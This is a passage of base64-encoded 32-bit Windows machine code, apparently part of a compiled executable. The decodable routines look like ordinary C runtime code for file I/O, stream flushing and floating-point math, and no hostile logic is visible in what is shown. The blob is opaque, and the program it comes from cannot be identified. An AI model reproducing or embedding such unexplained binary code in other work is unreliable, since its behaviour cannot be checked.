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F6B+f4HAAB3bGYPEkQkBGYPKA1QHgEQZg8oFcAeARBmD1TBZg9WwvIPwtAAZg/FwgCD+AB0B90F+B4BEMO66QMAAOtPZg8SFcAeARDyD17QZg8SDfAeARC6CAAAAOs0Zg8SDeAeARDyD1nBusz////pF/7//4PBAYHh/wcAAIH5/wcAAHM6Zg9XyfIPXsm6CQAAAIPsHGYPE0wkEIlUJAyL1IPCEIlUJAiDwhCJVCQEiRQk6CQGAADdRCQQg8Qcw2YPElQkBGYPEkQkBGYPftBmD3PSIGYPftGB4f//DwALwYP4AHSguukDAADrpo2kJAAAAADrA8zMzMaFcP////4K7XU72cnZ8esNxoVw/////jLt2ereyegrAQAA2ejewfaFYf///wF0BNno3vH2wkB1Atn9Cu10Atng6bICAADoRgEAAAvAdBQy7YP4AnQC9tXZydnh66/ptQIAAOlLAwAA3djd2NstUB8BEMaFcP///wLD2e3Zydnkm929YP///5v2hWH///9BddLZ8cPGhXD///8C3djbLVofARDDCsl1U8PZ7OsC2e3ZyQrJda7Z8cPpWwIAAOjPAAAA3djd2ArJdQ7Z7oP4AXUGCu10Atngw8aFcP///wLbLVAfARCD+AF17QrtdOnZ4Ovl3djpDQIAAN3Y6bUCAABY2eSb3b1g////m/aFYf///wF1D93Y2y1QHwEQCu10Atngw8aFcP///wTp1wEAAN3Y3djbLVAfARDGhXD///8DwwrJda/d2NstUB8BEMPZwNnh2y1uHwEQ3tmb3b1g////m/aFYf///0F1ldnA2fzZ5JvdvWD///+bipVh////2cnY4dnkm929YP///9nh2fDD2cDZ/NjZm9/gnnUa2cDcDYIfARDZwNn83tmb3+CedA24AQAAAMO4AAAAAOv4uAIAAADr8VaD7HSL9FaD7AjdHCSD7AjdHCSb3XYI6B8KAACDxBTdZgjdBoPEdF6FwHQF6dABAADDzMzMzMzMzMzMgHoOBXURZoudXP///4DPAoDn/rM/6wRmuz8TZomdXv///9mtXv///7veHwEQ2eWJlWz///+b3b1g////xoVw////AJuKjWH////Q4dD50MGKwSQP1w++wIHhBAQAAIvaA9iDwxD/I4B6DgV1EWaLnVz///+AzwKA5/6zP+sEZrs/E2aJnV7////ZrV7///+73h8BENnliZVs////m929YP///8aFcP///wDZyYqNYf///9nlm929YP///9nJiq1h////0OXQ/dDFisUkD9eK4NDh0PnQwYrBJA/X0OTQ5ArED77AgeEEBAAAi9oD2IPDEP8j6M4AAADZyd3Yw+jEAAAA6/bd2N3Y2e7D3djd2NnuhO10Atngw93Y3djZ6MPbvWL////brWL////2hWn///9AdAjGhXD///8Aw8aFcP///wDcBc4fARDD2cnbvWL////brWL////2hWn///9AdAnGhXD///8A6wfGhXD///8A3sHD271i////261i////9oVp////QHQg2cnbvWL////brWL////2hWn///9AdAnGhXD///8A6wfGhXD///8B3sHD3djd2NstsB8BEIC9cP///wB/B8aFcP///wEKycPd2N3Y2y3EHwEQCu10AtngCsl0CN0F1h8BEN7JwwrJdALZ4MPMzMzMzMzMzMzMzMzZwNn83OHZydng2fDZ6N7B2f3d2cOLVCQEgeIAAwAAg8p/ZolUJAbZbCQGw6kAAAgAdAa4AAAAAMPcBfAfARC4AAAAAMOLQgQlAADwfz0AAPB/dAPdAsOLQgSD7AoNAAD/f4lEJAaLQgSLCg+kyAvB4QuJRCQEiQwk2ywkg8QKqQAAAACLQgTDi0QkCCUAAPB/PQAA8H90AcOLRCQIw2aBPCR/AnQD2SwkWsNmiwQkZj1/AnQeZoPgIHQVm9/gZoPgIHQMuAgAAADo2QAAAFrD2SwkWsOD7AjdFCSLRCQEg8QIJQAA8H/rFIPsCN0UJItEJASDxAglAADwf3Q9PQAA8H90X2aLBCRmPX8CdCpmg+AgdSGb3+Bmg+AgdBi4CAAAAIP6HXQH6HsAAABaw+hdAAAAWsPZLCRaw90FHCABENnJ2f3d2dnA2eHcHQwgARCb3+CeuAQAAABzx9wNLCABEOu/3QUUIAEQ2cnZ/d3Z2cDZ4dwdBCABEJvf4J64AwAAAHae3A0kIAEQ65bMzMzMVYvsg8TgiUXgi0UYiUXwi0UciUX06wlVi+yDxOCJReDdXfiJTeSLRRCLTRSJReiJTeyNRQiNTeBQUVLoWwcAAIPEDN1F+GaBfQh/AnQD2W0IycOL/1WL7IPsJKEkQAEQM8WJRfyDPUyNARAAVld0EP81WI0BEP8VFOAAEIv46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